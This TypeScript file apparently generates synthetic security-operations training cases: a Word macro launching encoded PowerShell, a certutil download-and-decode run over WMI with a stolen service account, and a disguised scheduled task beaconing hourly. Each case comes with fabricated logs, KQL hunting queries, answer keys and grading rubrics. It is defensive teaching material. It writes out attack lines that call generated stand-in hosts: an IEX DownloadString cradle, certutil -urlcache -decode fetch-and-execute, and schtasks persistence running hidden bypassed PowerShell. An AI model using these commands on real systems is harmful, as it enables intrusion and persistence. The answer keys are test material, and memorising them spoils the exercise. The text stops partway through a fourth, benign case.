// Malware & endpoint scenarios. Each one competes with benign look-alikes the
// noise generators plant fleet-wide: SCCM's encoded PowerShell, admins'
// certutil -hashfile, updater scheduled tasks, IT's PowerShell cleanup task.
// The benign PsExec deployment is the twin of the malicious DC lateral move.
import type { CaseTemplate } from '../model.ts';
import type { RowRef } from '../../logs/corpus.ts';
import { HOUR, MIN, SEC, localHour } from '../../logs/time.ts';
import { BIN, binaryHash } from '../../synth/software.ts';
import { utf16leBase64 } from '../../synth/encoding.ts';
import { domain, host, ip, kdt, rubric, sha, technique, user } from './util.ts';

const PS_UA = 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.26100.1882';

function localClock(ms: number, offset: number): string {
  const h = localHour(ms, offset);
  return `${String(Math.floor(h)).padStart(2, '0')}:${String(Math.floor((h % 1) * 60)).padStart(2, '0')}`;
}

// ---------------------------------------------------------------------------
// Word macro spawns encoded PowerShell (TRUE POSITIVE)
// ---------------------------------------------------------------------------
const encodedPowerShell: CaseTemplate = {
  id: 'endpoint-encoded-powershell',
  category: 'malware',
  difficulty: 'tier2',
  title: 'Encoded PowerShell on a laptop',
  lesson: 'Macro document spawning a download cradle and a beacon',
  cysaDomains: ['1.0', '3.0'],
  tactics: ['execution', 'defense-evasion'],
  kind: 'incident',
  stages: ['execution'],
  when: 'business',
  build(ctx) {
    const { rng, log, pick, idx, at, world } = ctx;
    const victim = ctx.foothold?.personId ? idx.person(ctx.foothold.personId) : pick.person({ windows: true, dept: ['Finance', 'Sales', 'Operations', 'Marketing', 'HR', 'Legal'] });
    const dev = idx.deviceOf(victim);
    const w = pick.where(victim, at);
    const c2 = ctx.infra.domain('c2', { style: 'tech' });
    const c2ip = ctx.infra.ip('c2');
    const c2b = ctx.infra.domain('c2b', { style: 'dga' });
    const c2bip = ctx.infra.ip('c2b');
    const share = victim.siteId === 'branch' ? 'FS02' : 'FS01';
    const docName = rng.pick(['Q4 Bonus Schedule.docm', 'Salary Review 2026.docm', 'Updated Holiday Policy.docm', 'Supplier Price List.docm']);
    const uploader = pick.person({ exclude: [victim], dept: victim.department, working: false });
    const sharePath = `\\\\${share}\\Shared\\${victim.department}\\${docName}`;
    const tDoc = at - rng.int(6, 12) * MIN;
    const script = `$ErrorActionPreference='SilentlyContinue';IEX (New-Object Net.WebClient).DownloadString('http://${c2}/a')`;
    const enc = utf16leBase64(script);

    log.file({ TimeGenerated: tDoc - rng.int(40, 180) * MIN, DeviceName: share, ActionType: 'FileCreated', FileName: docName, FolderPath: `D:\\Shares\\Shared\\${victim.department}\\${docName}`, FileSize: rng.int(60_000, 140_000), SHA256: ctx.infra.hash('attachment'), InitiatingProcessFileName: 'system', InitiatingProcessAccountName: uploader.sam });
    const word = log.proc({ TimeGenerated: tDoc, DeviceName: dev.name, AccountName: victim.sam, FileName: 'winword.exe', FolderPath: BIN.winword.path, ProcessCommandLine: `"${BIN.winword.path}" /n "${sharePath}"`, SHA256: binaryHash('winword.exe'), Signer: BIN.winword.signer, ProcessIntegrityLevel: 'Medium', InitiatingProcessFileName: 'explorer.exe', InitiatingProcessCommandLine: 'C:\\Windows\\Explorer.EXE' });
    const tPs = tDoc + rng.int(20, 60) * SEC;
    const ps = log.proc({ TimeGenerated: tPs, DeviceName: dev.name, AccountName: victim.sam, FileName: 'powershell.exe', FolderPath: BIN.powershell.path, ProcessCommandLine: `powershell.exe -nop -w hidden -enc ${enc}`, SHA256: binaryHash('powershell.exe'), Signer: BIN.powershell.signer, ProcessIntegrityLevel: 'Medium', InitiatingProcessFileName: 'winword.exe', InitiatingProcessCommandLine: `"${BIN.winword.path}" /n "${sharePath}"` });
    log.dns({ TimeGenerated: tPs + 2 * SEC, ClientIP: w.lanIp, Computer: 'DC01', Name: c2 });
    const stage1 = [
      log.proxy({ TimeGenerated: tPs + 3 * SEC, SourceIP: w.lanIp, SourceUser: victim.sam, Method: 'GET', Url: `http://${c2}/a`, DestinationHost: c2, DestinationIP: c2ip, DestinationPort: 80, StatusCode: 200, BytesSent: rng.int(250, 400), BytesReceived: rng.int(2_400, 6_800), Category: 'Uncategorized', UserAgent: PS_UA }),
      log.net({ TimeGenerated: tPs + 3 * SEC, DeviceName: dev.name, LocalIP: w.lanIp, RemoteIP: c2ip, RemotePort: 80, RemoteUrl: c2, InitiatingProcessFileName: 'powershell.exe', InitiatingProcessAccountName: victim.sam }),
    ];
    log.dns({ TimeGenerated: tPs + 40 * SEC, ClientIP: w.lanIp, Computer: 'DC01', Name: c2b });
    const beacons: RowRef[] = [];
    const period = rng.pick([45, 60, 90]) * SEC;
    for (let t = tPs + 42 * SEC; t < ctx.now - 30 * SEC; t += period + rng.int(-5, 5) * SEC) {
      beacons.push(log.net({ TimeGenerated: t, DeviceName: dev.name, LocalIP: w.lanIp, RemoteIP: c2bip, RemotePort: 443, RemoteUrl: c2b, InitiatingProcessFileName: 'powershell.exe', InitiatingProcessAccountName: victim.sam }));
      beacons.push(log.proxy({ TimeGenerated: t, SourceIP: w.lanIp, SourceUser: victim.sam, Method: 'CONNECT', Url: `${c2b}:443`, DestinationHost: c2b, DestinationIP: c2bip, DestinationPort: 443, StatusCode: 200, BytesSent: rng.int(600, 900), BytesReceived: rng.int(200, 500), Category: 'Uncategorized', UserAgent: PS_UA }));
    }

    return {
      alert: {
        rule: 'Suspicious PowerShell command line',
        product: 'Microsoft Defender for Endpoint',
        severity: 'medium',
        time: at,
        summary: `powershell.exe on ${dev.name} ran with a hidden window and an encoded command.`,
        entities: [
          { kind: 'host', value: dev.name },
          { kind: 'user', value: victim.upn, label: victim.display },
          { kind: 'process', value: 'powershell.exe' },
        ],
        fields: [['Command line', `powershell.exe -nop -w hidden -enc ${enc.slice(0, 44)}…`], ['Integrity', 'Medium']],
      },
      briefing: `${world.org.name} blocks macros in documents from the internet, but not in documents opened from internal file shares. Endpoint management (SCCM) also runs encoded PowerShell on every device.`,
      truth: { disposition: 'true-positive', severity: 'high', action: 'escalate', techniques: ['T1059.001', 'T1204.002', 'T1027'], tactics: ['execution', 'defense-evasion'], alsoAccept: ['T1566.001', 'T1105', 'T1071.001', 'T1140', 'T1039', 'T1080'] },
      evidence: [
        { id: 'chain', label: `WINWORD.EXE opened a macro document from ${share} and spawned the hidden, encoded PowerShell as ${victim.sam}`, why: 'Documents do not launch PowerShell; macros do. SCCM’s encoded PowerShell runs as SYSTEM under CcmExec — this one runs as the user under Word.', rows: [ps, word] },
        { id: 'cradle', label: `The decoded command downloads and executes a second stage from ${c2} — and it did`, why: 'IEX(DownloadString) is an in-memory download cradle. The proxy shows it succeeding.', rows: stage1 },
        { id: 'beacon', label: `PowerShell is now beaconing to ${c2b} every ~${Math.round(period / SEC)}s`, why: 'The host is under active command and control.', rows: beacons },
      ],
      indicators: {
        block: [domain(c2, 'Stage-1 download'), ip(c2ip), domain(c2b, 'C2'), ip(c2bip)],
        scope: [user(victim), host(dev.name)],
        mustNot: [host('SCCM01'), { kind: 'file', value: 'ccmexec.exe' }],
      },
      hints: [
        'Encoded PowerShell runs on this fleet every day — SCCM does it. What launched this one, under which account, and what does the command decode to?',
        `DeviceProcessEvents | where ProcessCommandLine contains "-enc" | summarize count() by InitiatingProcessFileName, AccountName`,
        `Decode it: DeviceProcessEvents | where DeviceName == "${dev.name}" and ProcessCommandLine has "-enc" | extend Decoded = base64_decode_tostring(extract(@"-enc\\s+(\\S+)", 1, ProcessCommandLine))`,
      ],
      solution: [
        { title: 'Who normally runs encoded PowerShell?', kql: 'DeviceProcessEvents\n| where ProcessCommandLine contains "-enc"\n| summarize Count = count(), Hosts = dcount(DeviceName) by InitiatingProcessFileName, AccountName', why: 'CcmExec as SYSTEM across the fleet — and once, winword.exe as a user.' },
        { title: 'Decode the outlier', kql: `DeviceProcessEvents\n| where DeviceName == "${dev.name}" and InitiatingProcessFileName == "winword.exe"\n| extend Decoded = base64_decode_tostring(extract(@"-enc\\s+(\\S+)", 1, ProcessCommandLine))\n| project TimeGenerated, AccountName, InitiatingProcessCommandLine, Decoded`, why: `A download cradle for http://${c2}/a, launched by Word opening a .docm from ${share}.` },
        { title: 'Did the cradle fetch anything?', kql: `WebProxy\n| where SourceUser == "${victim.sam}" and UserAgent has "WindowsPowerShell"\n| project TimeGenerated, Method, Url, DestinationIP, StatusCode, BytesReceived`, why: 'Yes — then a steady CONNECT cadence to a second host.' },
        { title: 'Network view from the endpoint', kql: `DeviceNetworkEvents\n| where DeviceName == "${dev.name}" and InitiatingProcessFileName == "powershell.exe"\n| project TimeGenerated, RemoteIP, RemotePort, RemoteUrl`, why: 'PowerShell holding a beacon open.' },
        { title: 'Where did the document come from?', kql: `DeviceFileEvents\n| where FileName == "${docName}"`, why: `Placed on the share by ${uploader.sam}'s account earlier — that account needs looking at too.` },
      ],
      rubric: rubric([
        ['parentchild', 'winword.exe → powershell.exe is an abnormal, high-signal parent/child chain.', ['parent', 'child', 'winword', 'word', 'macro']],
        ['flags', '-nop -w hidden -enc: no profile, hidden window, encoded command — intent hidden from casual review.', ['-enc', 'hidden', '-nop', 'encoded', 'flags']],
        ['cradle', 'The decoded payload is an IEX download cradle; the proxy confirms the second stage was fetched.', ['iex', 'download', 'cradle', 'webclient', 'decoded', 'second stage']],
        ['beacon', 'PowerShell is beaconing to a second domain — active C2.', ['beacon', 'c2', 'command and control', 'cadence', 'connect']],
        ['isolate', 'Isolate the host, block the domains, pull the document from the share, and check who placed it.', ['isolate', 'contain', 'block', 'share', 'hunt']],
      ]),
      explanation: [
        `Encoded PowerShell alone is not the tell — SCCM runs it on this fleet all day, as SYSTEM under CcmExec. This one is different on every axis: it runs as ${victim.sam}, its parent is WINWORD.EXE opening ${docName} from ${share}, and it stacks -nop -w hidden -enc to stay out of sight. Documents don't launch PowerShell; macros do.`,
        `Decoding the base64 (UTF-16LE, as PowerShell expects) gives an IEX(DownloadString) cradle for http://${c2}/a. The proxy shows the fetch succeeding with a PowerShell user agent, and within a minute the same process holds a steady CONNECT cadence to ${c2b} — active command and control.`,
        `Escalate and contain: isolate ${dev.name}, block both domains and IPs, remove ${docName} from the share and hunt for anyone else who opened it. The file was placed there by ${uploader.sam}'s account, which needs examining as the likely earlier foothold.`,
      ],
      pitfalls: [
        'Filtering on "-enc" alone floods you with SCCM inventory runs. Parent process and account are what separate them.',
        'Blocking the domains is not containment — the endpoint already executed code and must be isolated and examined.',
      ],
      references: [technique('T1059.001'), technique('T1027')],
    };
  },
};

// ---------------------------------------------------------------------------
// certutil LOLBin download, launched remotely over WMI (TRUE POSITIVE)
// ---------------------------------------------------------------------------
const certutilDownload: CaseTemplate = {
  id: 'endpoint-certutil-download',
  category: 'malware',
  difficulty: 'tier2',
  title: 'certutil file download',
  lesson: 'LOLBin payload launched over WMI with a stolen service account',
  cysaDomains: ['1.0', '3.0'],
  tactics: ['command-and-control', 'defense-evasion'],
  kind: 'incident',
  stages: ['execution', 'lateral'],
  when: 'any',
  build(ctx) {
    const { rng, log, pick, idx, at, world } = ctx;
    const ad = world.org.netbios;
    const targetOwner = pick.person({ windows: true, dept: ['Finance', 'Operations', 'Sales', 'HR', 'Engineering'] });
    const target = idx.deviceOf(targetOwner);
    const sourceOwner = ctx.foothold?.personId ? idx.person(ctx.foothold.personId) : pick.person({ windows: true, exclude: [targetOwner] });
    const source = ctx.foothold?.host ? idx.host(ctx.foothold.host) : idx.deviceOf(sourceOwner);
    const acct = 'svc-backup';
    const payloadIp = ctx.infra.ip('payload');
    const c2 = ctx.infra.domain('c2', { style: 'tech' });
    const c2ip = ctx.infra.ip('c2');
    const exeHash = ctx.infra.hash('loader');
    const dir = 'C:\\ProgramData';
    const stem = rng.hex(6);
    const txt = `${dir}\\${stem}.txt`;
    const exe = `${dir}\\${stem}.exe`;
    const url = `http://${payloadIp}/${rng.pick(['update', 'tmp', 'x', 'cdn'])}/${rng.hex(6)}.txt`;
    const t0 = at - rng.int(6, 14) * MIN;
    const logon = log.sec({ TimeGenerated: t0 - rng.int(20, 50) * SEC, Computer: target.name, EventID: 4624, Account: '-', TargetAccount: `${ad}\\${acct}`, LogonType: 3, IpAddress: source.ip, WorkstationName: source.name, AuthenticationPackage: 'NTLM', ElevatedToken: 'Yes' });
    const proc = (t: number, file: string, cmd: string, parent: string, parentCmd: string, account = acct) =>
      log.proc({ TimeGenerated: t, DeviceName: target.name, AccountName: account, FileName: file, FolderPath: file === 'cmd.exe' ? BIN.cmd.path : file === 'certutil.exe' ? BIN.certutil.path : exe, ProcessCommandLine: cmd, SHA256: file.endsWith(`${stem}.exe`) ? exeHash : binaryHash(file), Signer: file.endsWith(`${stem}.exe`) ? 'Unsigned' : 'Microsoft Windows', ProcessIntegrityLevel: 'High', InitiatingProcessFileName: parent, InitiatingProcessCommandLine: parentCmd });
    const cmd = proc(t0, 'cmd.exe', `cmd.exe /q /c certutil.exe -urlcache -split -f ${url} ${txt} & certutil.exe -decode ${txt} ${exe} & ${exe}`, 'wmiprvse.exe', 'C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding');
    const dl = proc(t0 + 1 * SEC, 'certutil.exe', `certutil.exe -urlcache -split -f ${url} ${txt}`, 'cmd.exe', 'cmd.exe /q /c certutil.exe …');
    const net1 = log.net({ TimeGenerated: t0 + 2 * SEC, DeviceName: target.name, LocalIP: target.ip, RemoteIP: payloadIp, RemotePort: 80, RemoteUrl: '', InitiatingProcessFileName: 'certutil.exe', InitiatingProcessAccountName: acct });
    const fTxt = log.file({ TimeGenerated: t0 + 4 * SEC, DeviceName: target.name, ActionType: 'FileCreated', FileName: `${stem}.txt`, FolderPath: txt, FileSize: rng.int(400_000, 900_000), SHA256: rng.hex(64), InitiatingProcessFileName: 'certutil.exe', InitiatingProcessAccountName: acct });
    const dec = proc(t0 + 6 * SEC, 'certutil.exe', `certutil.exe -decode ${txt} ${exe}`, 'cmd.exe', 'cmd.exe /q /c certutil.exe …');
    const fExe = log.file({ TimeGenerated: t0 + 7 * SEC, DeviceName: target.name, ActionType: 'FileCreated', FileName: `${stem}.exe`, FolderPath: exe, FileSize: rng.int(300_000, 650_000), SHA256: exeHash, InitiatingProcessFileName: 'certutil.exe', InitiatingProcessAccountName: acct });
    const run = proc(t0 + 9 * SEC, `${stem}.exe`, exe, 'cmd.exe', 'cmd.exe /q /c certutil.exe …');
    const beacons: RowRef[] = [];
    for (let t = t0 + 20 * SEC; t < ctx.now - 20 * SEC && beacons.length < 12; t += rng.int(55, 70) * SEC) {
      beacons.push(log.net({ TimeGenerated: t, DeviceName: target.name, LocalIP: target.ip, RemoteIP: c2ip, RemotePort: 443, RemoteUrl: c2, InitiatingProcessFileName: `${stem}.exe`, InitiatingProcessAccountName: acct }));
    }
    log.dns({ TimeGenerated: t0 + 18 * SEC, ClientIP: target.ip, Computer: 'DC01', Name: c2 });
    const backupIdentity = log.identityRef(acct);

    return {
      alert: {
        rule: 'Suspicious file download using certutil',
        product: 'Microsoft Defender for Endpoint',
        severity: 'medium',
        time: at,
        summary: `certutil.exe on ${target.name} downloaded a file from ${payloadIp} into ProgramData.`,
        entities: [
          { kind: 'host', value: target.name },
          { kind: 'process', value: 'certutil.exe' },
          { kind: 'ip', value: payloadIp },
        ],
        fields: [['Command line', `certutil.exe -urlcache -split -f ${url} ${txt}`]],
      },
      briefing: `${world.org.name} IT staff use certutil routinely to check installer hashes. svc-backup is the backup service account; it is a local administrator on servers.`,
      truth: { disposition: 'true-positive', severity: 'high', action: 'escalate', techniques: ['T1105', 'T1140'], tactics: ['command-and-control', 'defense-evasion'], alsoAccept: ['T1047', 'T1218', 'T1071.001', 'T1078.002', 'T1021.002', 'T1570', 'T1078'] },
      evidence: [
        { id: 'download', label: 'certutil fetched an encoded .txt from a bare IP, then -decode turned it into an .exe', why: 'Signed Microsoft binary, illegitimate use: -urlcache is a downloader, -decode unwraps base64 to slip past content inspection.', rows: [dl, net1, fTxt, dec, fExe] },
        { id: 'executed', label: `The dropped ${stem}.exe executed and is beaconing to ${c2}`, why: 'Attempt became infection.', rows: [run, ...beacons] },
        { id: 'origin', label: `It was launched remotely over WMI with svc-backup credentials from ${source.name}`, why: `WmiPrvSE as the parent plus an NTLM network logon from another workstation: lateral movement with a stolen service account. ${source.name} is the next host to look at.`, rows: [cmd, logon] },
        { id: 'account', label: 'svc-backup is a privileged service account that should never log on to workstations interactively or from a workstation', why: 'Its only legitimate source is BKP01, at night.', rows: [backupIdentity] },
      ],
      indicators: {
        block: [ip(payloadIp, 'Payload host'), domain(c2, 'C2'), ip(c2ip, 'C2'), sha(exeHash, `${stem}.exe`)],
        scope: [host(target.name), host(source.name), { kind: 'user', value: acct, aliases: [`${acct}@${world.org.domain}`, `${ad}\\${acct}`] }],
        mustNot: [host('BKP01')],
      },
      hints: [
        'IT runs certutil here all the time. Compare this command line with the others — and ask what launched it, as which account, and from where.',
        `DeviceProcessEvents | where DeviceName == "${target.name}" and TimeGenerated > ${kdt(t0 - 2 * MIN)} | project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName`,
        `SecurityEvent | where Computer == "${target.name}" and TargetAccount has "${acct}"`,
      ],
      solution: [
        { title: 'certutil across the fleet', kql: 'DeviceProcessEvents\n| where FileName == "certutil.exe"\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine', why: 'Admins hash installers (-hashfile). One host downloads and decodes.' },
        { title: 'The full chain on the host', kql: `DeviceProcessEvents\n| where DeviceName == "${target.name}" and TimeGenerated > ${kdt(t0 - 2 * MIN)}\n| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName`, why: 'WmiPrvSE → cmd → certutil ×2 → the dropped exe.' },
        { title: 'Files written', kql: `DeviceFileEvents\n| where DeviceName == "${target.name}" and FolderPath startswith "C:\\\\ProgramData\\\\${stem}"`, why: 'Encoded .txt, then the decoded executable.' },
        { title: 'Network activity', kql: `DeviceNetworkEvents\n| where DeviceName == "${target.name}" and InitiatingProcessAccountName == "${acct}"\n| project TimeGenerated, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl`, why: 'Download from a bare IP, then steady C2.' },
        { title: 'How did svc-backup get there?', kql: `SecurityEvent\n| where TargetAccount has "${acct}" and EventID == 4624\n| project TimeGenerated, Computer, LogonType, IpAddress, WorkstationName, AuthenticationPackage`, why: `Normally Kerberos from BKP01 at night. Here: NTLM from ${source.name}, a workstation.` },
        { title: 'What is svc-backup supposed to be?', kql: `IdentityInfo\n| where AccountName == "${acct}"`, why: 'A privileged backup account — high-value credentials.' },
      ],
      rubric: rubric([
        ['lolbin', 'certutil -urlcache/-decode is a living-off-the-land download, not certificate work.', ['certutil', 'lolbin', 'urlcache', 'decode', 'living off']],
        ['dropexec', 'It wrote an encoded file, decoded it to an EXE in ProgramData, which executed and beacons.', ['programdata', 'dropped', 'executed', 'exe', 'beacon']],
        ['wmi', 'Launched remotely via WMI (WmiPrvSE parent) using svc-backup over NTLM — lateral movement.', ['wmi', 'wmiprvse', 'remote', 'lateral', 'ntlm']],
        ['svcacct', `svc-backup came from ${source.name}, a workstation — stolen service-account credentials.`, ['service account', 'svc-backup', 'stolen', source.name.toLowerCase()]],
        ['contain', 'Isolate both hosts, reset svc-backup, block the IPs/domain/hash, and scope other hosts it touched.', ['isolate', 'reset', 'block', 'scope', 'contain']],
      ]),
      explanation: [
        `certutil is a signed Microsoft utility, and IT here uses it every week to hash installers. That is -hashfile. This is -urlcache -split -f against a bare IP, pulling a .txt that -decode then turns into an .exe in ProgramData — the classic living-off-the-land download, with base64 wrapping to slip past content inspection. The dropped binary ran and is beaconing to ${c2}.`,
        `The more important finding is how it started. The parent is WmiPrvSE: the command was executed remotely over WMI. The matching 4624 is a network logon for svc-backup over NTLM from ${source.name} — a workstation — at ${localClock(t0, world.org.utcOffset)} local time. svc-backup normally logs on only from BKP01, at night, with Kerberos. Someone holds that service account's credentials and is using them to move between machines.`,
        `Escalate: isolate ${target.name} and ${source.name}, reset svc-backup (and review where else it logged on), block ${payloadIp}, ${c2} and the executable hash, and treat ${source.name} as the earlier point of compromise.`,
      ],
      pitfalls: [
        '"Signed Microsoft binary" is not a clean bill of health — LOLBins are trusted binaries used maliciously.',
        'Stopping at the download misses the lateral movement: the parent process and logon tell you where the attacker actually is.',
      ],
      references: [technique('T1105'), technique('T1140'), { label: 'LOLBAS — certutil', url: 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/' }],
    };
  },
};

// ---------------------------------------------------------------------------
// Scheduled task persistence masquerading as an updater (TRUE POSITIVE)
// ---------------------------------------------------------------------------
const scheduledTask: CaseTemplate = {
  id: 'endpoint-scheduled-task',
  category: 'persistence',
  difficulty: 'tier2',
  title: 'New scheduled task running PowerShell',
  lesson: 'Masquerading scheduled task used as an hourly C2 beacon',
  cysaDomains: ['1.0', '3.0'],
  tactics: ['persistence', 'execution'],
  kind: 'incident',
  stages: ['persistence'],
  when: 'any',
  build(ctx) {
    const { rng, log, pick, idx, at, world } = ctx;
    const victim = ctx.foothold?.personId ? idx.person(ctx.foothold.personId) : pick.person({ windows: true });
    const dev = idx.deviceOf(victim);
    const ad = world.org.netbios;
    const taskName = rng.pick(['\\Microsoft\\Windows\\UpdateOrchestrator\\SysCheck', '\\GoogleUpdateTaskMachineCoree', '\\OneDriveSync', '\\Microsoft\\Office\\OfficeTelemetryAgentLogon2']);
    const dir = `C:\\ProgramData\\${rng.hex(5)}`;
    const scriptPath = `${dir}\\svc.ps1`;
    const c2 = ctx.infra.domain('c2', { style: 'tech' });
    const c2ip = ctx.infra.ip('c2');
    const action = `powershell.exe -ep bypass -w hidden -f ${scriptPath}`;
    const tCreate = at - rng.int(200, 320) * MIN;
    const w = pick.where(victim, tCreate);
    const lan = w.lanIp;
    const psParent = log.proc({ TimeGenerated: tCreate - 50 * SEC, DeviceName: dev.name, AccountName: victim.sam, FileName: 'powershell.exe', FolderPath: BIN.powershell.path, ProcessCommandLine: 'powershell.exe -nop -w hidden', SHA256: binaryHash('powershell.exe'), Signer: BIN.powershell.signer, ProcessIntegrityLevel: 'High', InitiatingProcessFileName: 'rundll32.exe', InitiatingProcessCommandLine: 'rundll32.exe' });
    const file = log.file({ TimeGenerated: tCreate - 20 * SEC, DeviceName: dev.name, ActionType: 'FileCreated', FileName: 'svc.ps1', FolderPath: scriptPath, FileSize: rng.int(700, 1400), SHA256: rng.hex(64), InitiatingProcessFileName: 'powershell.exe', InitiatingProcessAccountName: victim.sam });
    const schtasks = log.proc({ TimeGenerated: tCreate, DeviceName: dev.name, AccountName: victim.sam, FileName: 'schtasks.exe', FolderPath: BIN.schtasks.path, ProcessCommandLine: `schtasks.exe /create /tn "${taskName}" /tr "${action}" /sc hourly /rl highest /f`, SHA256: binaryHash('schtasks.exe'), Signer: BIN.schtasks.signer, ProcessIntegrityLevel: 'High', InitiatingProcessFileName: 'powershell.exe', InitiatingProcessCommandLine: 'powershell.exe -nop -w hidden' });
    const created = log.sec({ TimeGenerated: tCreate + 1 * SEC, Computer: dev.name, EventID: 4698, Account: `${ad}\\${victim.sam}`, TaskName: taskName, TaskAction: `${action} (Hourly, indefinitely; Run level: Highest; Hidden: True)` });
    const itTask = log.find('SecurityEvent', (r) => r.EventID === 4698 && r.TaskName === '\\IT\\WeeklyTempCleanup');
    const runs: RowRef[] = [];
    const calls: RowRef[] = [];
    for (let t = tCreate + HOUR; t < ctx.now - MIN; t += HOUR + rng.int(-20, 20) * SEC) {
      runs.push(log.proc({ TimeGenerated: t, DeviceName: dev.name, AccountName: 'SYSTEM', FileName: 'powershell.exe', FolderPath: BIN.powershell.path, ProcessCommandLine: action, SHA256: binaryHash('powershell.exe'), Signer: BIN.powershell.signer, ProcessIntegrityLevel: 'System', InitiatingProcessFileName: 'svchost.exe', InitiatingProcessCommandLine: 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule' }));
      calls.push(log.proxy({ TimeGenerated: t + 3 * SEC, SourceIP: lan, SourceUser: '', Method: 'GET', Url: `http://${c2}/c`, DestinationHost: c2, DestinationIP: c2ip, DestinationPort: 80, StatusCode: 200, BytesSent: rng.int(180, 260), BytesReceived: rng.pick([0, 0, rng.int(300, 3_000)]), Category: 'Uncategorized', UserAgent: PS_UA }));
      log.dns({ TimeGenerated: t + 2 * SEC, ClientIP: lan, Computer: 'DC01', Name: c2 });
    }

    return {
      alert: {
        rule: 'Scheduled task created with suspicious action',
        product: 'Microsoft Sentinel',
        severity: 'medium',
        time: at,
        summary: `A scheduled task "${taskName}" on ${dev.name} runs a PowerShell script from ProgramData with execution policy bypass.`,
        entities: [
          { kind: 'host', value: dev.name },
          { kind: 'user', value: victim.upn, label: victim.display },
        ],
        fields: [['Task name', taskName], ['Created', `${new Date(tCreate).toISOString().slice(11, 16)} UTC`]],
      },
      briefing: `${world.org.name}: software updaters create scheduled tasks on laptops constantly, and IT deploys its own PowerShell maintenance tasks under change control.`,
      attachments: [
        {
          title: 'svc.ps1 — EDR file analysis summary',
          kind: 'kv',
          body: [
            ['Path', scriptPath],
            ['Size', '1.1 KB, PowerShell'],
            ['Signature', 'Unsigned'],
            ['Capabilities', 'Network access (HTTP), dynamic code execution'],
            ['Prevalence', 'Seen on 1 device in the organisation'],
          ],
          caption: 'Static analysis by the EDR sandbox. What it talks to is in the network logs.',
        },
      ],
      truth: { disposition: 'true-positive', severity: 'high', action: 'escalate', techniques: ['T1053.005'], tactics: ['persistence', 'execution'], alsoAccept: ['T1036.004', 'T1036.005', 'T1059.001', 'T1071.001', 'T1105'] },
      evidence: [
        { id: 'created', label: `The task was created by ${victim.sam}'s hidden PowerShell with schtasks /rl highest — not by an installer or IT`, why: 'Updaters register tasks as the machine account from their own installers; IT registers under a change ticket. This came from a hidden PowerShell under a user session.', rows: [created, schtasks, file, psParent] },
        { id: 'runs', label: 'It has run every hour since, as SYSTEM', why: 'Persistence that survives reboots and runs with the highest privileges.', rows: runs },
        { id: 'c2', label: `Each run polls ${c2} for commands`, why: 'An hourly beacon executing whatever the server returns.', rows: calls },
      ],
      indicators: {
        block: [domain(c2, 'C2'), ip(c2ip, 'C2')],
        scope: [host(dev.name), user(victim)],
        mustNot: itTask ? [{ kind: 'host', value: String(itTask.row.Computer), note: "IT's own cleanup task, under change control" }] : [],
      },
      hints: [
        'Plenty of tasks get created here. Who created this one, how, and what does it actually run?',
        `SecurityEvent | where EventID == 4698 | project TimeGenerated, Computer, Account, TaskName, TaskAction`,
        `DeviceProcessEvents | where DeviceName == "${dev.name}" and ProcessCommandLine has "svc.ps1"`,
      ],
      solution: [
        { title: 'All task creations', kql: 'SecurityEvent\n| where EventID == 4698\n| project TimeGenerated, Computer, Account, TaskName, TaskAction', why: 'Updaters as the machine account; IT under a change; one task created by a user account running a ProgramData script hidden.' },
        { title: 'How was it created?', kql: `DeviceProcessEvents\n| where DeviceName == "${dev.name}" and TimeGenerated between (${kdt(tCreate - 5 * MIN)} .. ${kdt(tCreate + MIN)})\n| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName`, why: 'Hidden PowerShell (child of rundll32) writing svc.ps1 and calling schtasks.' },
        { title: 'Has it run?', kql: `DeviceProcessEvents\n| where DeviceName == "${dev.name}" and ProcessCommandLine has "svc.ps1"\n| project TimeGenerated, AccountName, InitiatingProcessCommandLine`, why: 'Hourly, as SYSTEM, via the Task Scheduler service.' },
        { title: 'What does it talk to?', kql: `WebProxy\n| where DestinationHost == "${c2}"\n| project TimeGenerated, SourceIP, Url, DestinationIP, StatusCode, BytesReceived`, why: 'An hourly poll for commands.' },
        { title: 'The written script', kql: `DeviceFileEvents\n| where FileName == "svc.ps1"`, why: 'Dropped minutes before the task was created.' },
      ],
      rubric: rubric([
        ['masquerade', 'The task name imitates a Windows/Google/OneDrive updater, but the action runs a script from a random ProgramData folder.', ['masquerade', 'name', 'legitimate-sounding', 'fake', 'updater', 'imitat']],
        ['persistence', 'Hourly trigger + highest run level + hidden = persistence mechanism.', ['persistence', 'hourly', 'highest', 'hidden', 'scheduled task']],
        ['beacon', 'Each run polls a domain and executes what it returns — C2.', ['beacon', 'iex', 'c2', 'poll', 'invoke-expression']],
        ['rootcause', 'Created by hidden PowerShell under a user session (child of rundll32) — find what ran before it.', ['root cause', 'rundll32', 'created by', 'earlier', 'initial']],
        ['remove', 'Isolate, delete the task, capture the script, block the domain, and hunt for the task name fleet-wide.', ['remove', 'delete task', 'capture', 'block', 'hunt']],
      ]),
      explanation: [
        `Attackers like scheduled tasks because they survive reboots and hide among legitimate maintenance jobs — and this fleet has plenty: Google, Office and OneDrive updaters register tasks as the machine account, and IT deploys its own PowerShell cleanup task under a change ticket. This one borrows an updater-sounding name, ${taskName}, but was created by ${victim.sam}'s hidden PowerShell session calling schtasks with /rl highest, and it runs powershell -ep bypass -w hidden against a script in a random ProgramData folder.`,
        `It has fired every hour since, as SYSTEM, and every run polls http://${c2}/c for commands to execute. That is a command-and-control beacon wearing a scheduled-task costume.`,
        `Escalate: isolate ${dev.name}, delete the task, preserve svc.ps1, block ${c2}, and hunt the fleet for the task name and folder. The task is a symptom — the hidden PowerShell was itself spawned by rundll32, so something already had code execution on this laptop.`,
      ],
      pitfalls: [
        'A familiar task name is not reassurance — check who created it and what it actually runs.',
        'Deleting the task without finding what created it leaves the attacker free to re-create it.',
      ],
      references: [technique('T1053.005'), technique('T1036.004')],
    };
  },
};

// ---------------------------------------------------------------------------
// Benign twin: PsExec deployment from the management server (BENIGN)
// ---------------------------------------------------------------------------
const benignAdminTool: CaseTemplate = {
  id: 'endpoint-benign-admin-psexec',
  category: 'lateral',
  difficulty: 'tier3',
  title: 'PsExec service installed remotely',
  lesson: 'Sanctioned deployment from the management server',
  cysaDomains: ['1.0'],
  tactics: [],
